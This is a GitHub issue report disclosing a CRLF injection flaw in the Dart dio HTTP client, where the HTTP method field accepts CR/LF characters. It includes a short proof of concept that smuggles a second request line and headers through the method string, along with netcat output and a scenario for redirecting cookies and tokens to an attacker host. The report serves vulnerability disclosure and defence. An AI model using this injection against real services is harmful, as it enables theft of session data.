| New Issue Checklist  * I have searched for a similar issue in the [project](https://github.com/flutterchina/dio/issues) and found none  Issue Info ENV: Any Examples generated on:  ``` Dart SDK version: 2.13.0-204.0.dev (dev) (Unknown timestamp) on "linux_x64" dio version: 4.0.0  ``` Issue Description and Steps Please consider given snippet:  ``` import 'package:dio/dio.dart';  void main() async {   var dio = Dio();   dio.options.baseUrl = 'http://localhost:1234';   var resp = await dio.request(     '/test',     options: Options(       method: "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nLLAMA:",       //method: "GET",     ),   ); } ```  Generated call looks like  ``` nc  -l -p 1234 GET HTTP://EXAMPLE.COM/ HTTP/1.1 HOST: EXAMPLE.COM LLAMA: /test HTTP/1.1 user-agent: Dart/2.13 (dart:io) accept-encoding: gzip content-length: 0 host: localhost:1234 ```  Which presents a security issue. Classic CRLF injection. Vector attack: If the attacker controls the HTTP method(verb), he can change a call and steal all cookies, session whatever is in a call. Assuming flow like `USER` -> `FOO` -> `BAR`, where flow between `FOO` and `BAR` is internal, mentioned data may leak.  Let's assume I'm replacing example.com with my-hackery-uservice.org and the victim(service) is working in a company behind the proxy. This means I can easily redirect calls with headers/cookies(tokens) and blah blah blah. By doing more advanced CRLF I can remove the requirement for proxy at all. Expected behavior: if HTTP method(verb) is invalid, raise error. |
